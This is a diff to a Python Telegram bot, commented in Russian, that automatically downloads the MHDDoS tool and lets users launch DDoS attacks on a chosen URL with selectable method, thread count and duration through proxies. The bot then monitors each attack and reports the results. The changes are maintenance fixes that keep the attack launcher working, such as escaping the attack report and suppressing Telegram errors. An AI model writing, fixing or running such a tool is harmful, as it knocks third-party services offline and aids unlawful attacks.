@@ -1,7 +1,7 @@
 #!/usr/bin/env python3
 # -*- coding: utf-8 -*-
 """
-MHDDoS БОТ — ВЕБХУК + АВТОЗАГРУЗКА MHDDoS (исправленная распаковка)
+MHDDoS БОТ — ВЕБХУК + АВТОЗАГРУЗКА MHDDoS (исправлено)
 """
 
 import asyncio
@@ -14,6 +14,7 @@ import requests
 import re
 import zipfile
 import io
+import html
 from datetime import datetime, timedelta
 from typing import Dict, List
 
@@ -46,7 +47,6 @@ except:
 #  АВТОЗАГРУЗКА MHDDOS (исправлена)
 # ==============================
 def ensure_mhddos():
-    """Если start.py отсутствует, скачиваем MHDDoS с GitHub и распаковываем"""
     if os.path.exists(MH_DDOS_PATH):
         return
     print("⬇️ MHDDoS не найден, скачиваю...")
@@ -58,7 +58,6 @@ def ensure_mhddos():
                 for file in z.namelist():
                     if file.startswith("MHDDoS-main/") and not file.endswith("/"):
                         new_name = file.replace("MHDDoS-main/", "")
-                        # Создаём папки, если нужно
                         if "/" in new_name:
                             os.makedirs(os.path.dirname(new_name), exist_ok=True)
                         data = z.read(file)
@@ -70,7 +69,6 @@ def ensure_mhddos():
     except Exception as e:
         print(f"❌ Ошибка загрузки: {e}")
 
-# Загружаем при старте
 ensure_mhddos()
 
 # ==============================
@@ -212,7 +210,6 @@ active_attacks = {}
 async def run_attack(user_id, method, url, threads, duration):
     update_proxies()
     if not os.path.exists(MH_DDOS_PATH):
-        # Если start.py не найден, пытаемся загрузить ещё раз
         await asyncio.get_event_loop().run_in_executor(None, ensure_mhddos)
         if not os.path.exists(MH_DDOS_PATH):
             raise Exception("MHDDoS не найден и не удалось скачать.")
@@ -379,13 +376,14 @@ def confirm_menu():
     ])
 
 # ==============================
-#  БЕЗОПАСНОЕ РЕДАКТИРОВАНИЕ
+#  БЕЗОПАСНОЕ РЕДАКТИРОВАНИЕ (добавлена обработка query is too old)
 # ==============================
 async def safe_edit(message, text, parse_mode="HTML", reply_markup=None):
     try:
         await message.edit_text(text, parse_mode=parse_mode, reply_markup=reply_markup)
     except Exception as e:
-        if "message is not modified" in str(e) or "message to edit not found" in str(e):
+        # Игнорируем ошибки, связанные с редактированием
+        if "message is not modified" in str(e) or "message to edit not found" in str(e) or "query is too old" in str(e):
             pass
         else:
             raise
@@ -641,7 +639,6 @@ async def duration_choose(callback: types.CallbackQuery):
 
 @dp.callback_query(F.data == "confirm_launch")
 async def confirm_launch(callback: types.CallbackQuery):
-    # Сначала отвечаем на callback
     await callback.answer()
     user_id = callback.from_user.id
     data = user_data.pop(user_id, {})
@@ -660,7 +657,6 @@ async def confirm_launch(callback: types.CallbackQuery):
             reply_markup=main_menu()
         )
         return
-    # Отправляем новое сообщение о загрузке
     loading_msg = await callback.message.answer("🔄 Загружаю прокси... Подождите 20-40 сек.", parse_mode="HTML")
     try:
         process = await run_attack(user_id, method, url, threads, duration)
@@ -715,7 +711,9 @@ async def monitor_attack(user_id):
     stdout, stderr = process.communicate()
     output = stdout or stderr
     report = output[-1000:] if output else "Атака завершена."
-    final = f"✅ <b>Атака завершена!</b>\n\n📊 <b>Отчёт:</b>\n<code>{report}</code>"
+    # Экранируем HTML-символы в отчёте
+    safe_report = html.escape(report)
+    final = f"✅ <b>Атака завершена!</b>\n\n📊 <b>Отчёт:</b>\n<code>{safe_report}</code>"
     try:
         await safe_edit(msg, final, reply_markup=main_menu())
     except:
